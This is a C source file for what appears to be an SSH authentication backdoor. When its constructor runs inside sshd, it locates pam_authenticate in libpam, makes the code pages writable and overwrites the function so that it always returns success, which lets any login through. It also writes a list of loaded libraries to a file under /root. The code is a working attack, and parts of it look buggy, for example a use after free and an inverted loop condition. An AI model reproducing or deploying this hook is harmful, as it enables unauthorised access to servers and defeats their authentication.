#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>

#include <security/pam_appl.h>
#include <sys/mman.h>

#include <dlfcn.h>
#include <link.h>

#include "bad.h"

static void handlesigsegv(int sig)
{
	//TODO SIGBUS and actually handle an error
	//unregister us
	signal(sig, SIG_DFL);
	kill(getpid(), sig);
}

static int retzero(pam_handle_t *x, int i)
{
	return 0;
}

/* 
 * libs should always be(?)loaded page aligned. 
 *   Get the distance of the function(dli->dli_saddr) to be hooked from this page aligned lib(map->l_addr)
 *   and round up to the next page and use this value for mprotect()
 *
 * there is still an extra mapping in /proc/$pid/maps ... not sure how big of a problem this is
 * FIXME: the stack frame SHOULD get fixed for us, it does on my system at least
 *
 * long long int prevpage = ((long long int) dli->dli_saddr / PAGE_SIZE) * PAGE_SIZE;
 * long long int nextpage = (((long long int) dli->dli_saddr / PAGE_SIZE) + 1) * PAGE_SIZE;
 *
 */
static int hook(void *lib, void *func, void *replace, size_t replacelen)
{
	int PAGE_SIZE = getpagesize();
	
	long long int distance = (long long int) func - (long long int)lib;
	long long int PAGES = ((long long int) distance / PAGE_SIZE) + 1;				

	size_t len = PAGE_SIZE * PAGES;
	mprotect((void *) lib, len, PROT_READ | PROT_WRITE | PROT_EXEC);
	
	memcpy(func, replace, replacelen);
	
	mprotect((void *) lib, len, PROT_READ | PROT_EXEC);

	return 0;
}

/*
 * lib = start of lib we search - use get_libstart()
 */
static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname, int (*dladdrptr)(void *, Dl_info *))      
{
	struct link_map *map = link_map;
	Dl_info *dli = malloc(sizeof(Dl_info));

	while (map != NULL) { 
		if ((void *) map->l_addr == lib) {
			void *libstart = (void *)map->l_addr;
			
			void *libend = (void *)map->l_next->l_addr; 
		
			bool done = false;
			while (done != true && libstart >= libend) {  
				dladdrptr(libstart, dli);
					
				if (dli->dli_sname != NULL && dli->dli_saddr != NULL) {
					if (strcmp(dli->dli_sname, funcname) == 0) {
						free(dli);
						return dli->dli_saddr;	
					}
				}
				libstart += 16; // XXX: testme += 64
			}	
		}
		map = map->l_next;
	} 

	free(dli);
	return NULL;
}

static void *get_libstart(struct link_map *link_map, char *lib)
{
	struct link_map *map = link_map;

	while (map != NULL) { 
		if (strstr(map->l_name, lib) != NULL) 
			return (void*)map->l_addr;

		map = map->l_next;
	}

	return NULL;
}

static void print_libs(struct link_map *link_map)
{
	FILE *fp;
	fp = fopen("/root/asf", "w");

	struct link_map *map = link_map;
	Dl_info *dli = malloc(sizeof(Dl_info));

	while (map != NULL) { 
		fprintf(fp, "%p : %s\n", (void *)map->l_addr, map->l_name);
		map = map->l_next;
	} 

	free(dli);
	fflush(fp);
	fclose(fp);

	return;
}

static int is_sshd(struct link_map *link_map)
{
	void *dlhandle = dlopen("libdl-2.13.so", RTLD_NOW);
	if (dlhandle == NULL)
		return -1;
	dlinfoptr = dlsym(dlhandle, "dlinfo");
	dladdrptr = dlsym(dlhandle, "dladdr");
	dlclose(dlhandle);
	
	if (!dlinfoptr || !dladdrptr)
		return -1;

	void *ourhandle = dlopen(NULL, 	RTLD_NOW);
	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *wrapstart = get_libstart(link_map, "libwrap.so.0");
	void *pamstart = get_libstart(link_map, "libpam.so.0");

	if (!wrapstart || !pamstart)
		return -1;
		
	void *hosts_access = find_func_ptr(link_map, wrapstart, "hosts_access", dladdrptr);
	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate", dladdrptr);

	if (!hosts_access || !pam_authenticate)
		return -1;

	return 0;
}


 __attribute__ ((constructor)) static void bad(void) 
{
	struct link_map *link_map;
	if (is_sshd(link_map) != 0)
		return;

	void *ourhandle = dlopen(NULL, 	RTLD_NOW);
	dlinfoptr(ourhandle, 2, &link_map);

	signal(SIGSEGV, handlesigsegv);

	print_libs(link_map);

	void *libpam = get_libstart(link_map, "libpam.so.0");
	void *pam_auth = find_func_ptr(link_map, libpam, "pam_authenticate", dladdrptr);

	hook(libpam, pam_auth, retzero, 20);
	
	return;
}


/*	
	void *dlhandle = dlopen("libdl-2.13.so", RTLD_NOW);
	dl_iterate_phdrptr = dlsym(dlhandle, "dl_iterate_phdr");
	dlclose(dlhandle);

static int callback(struct dl_phdr_info *info, size_t size, void *data)
{
	int j;
	FILE *fp = fopen("/root/asd", "a+");

	fprintf(fp, "name=%s (%d segments)\n", info->dlpi_name,
			info->dlpi_phnum);

	for (j = 0; j < info->dlpi_phnum; j++) {
		fprintf(fp, "\t\theader %2d: addr=%10p - offset=%d - vaddr=%p - paddr=%p - filesz=%llu - memsz=%llu - align=%llu\n",
					 j,  (void*)(info->dlpi_addr + info->dlpi_phdr[j].p_vaddr), (int)info->dlpi_phdr[j].p_offset, (void*)info->dlpi_phdr[j].p_vaddr,
						 (void*)info->dlpi_phdr[j].p_paddr,	(unsigned long long int)info->dlpi_phdr[j].p_filesz, 
						 (unsigned long long int)info->dlpi_phdr[j].p_memsz, (unsigned long long int)info->dlpi_phdr[j].p_align);
	}
	fflush(fp);
	fclose(fp);
	return 0;
}

*/
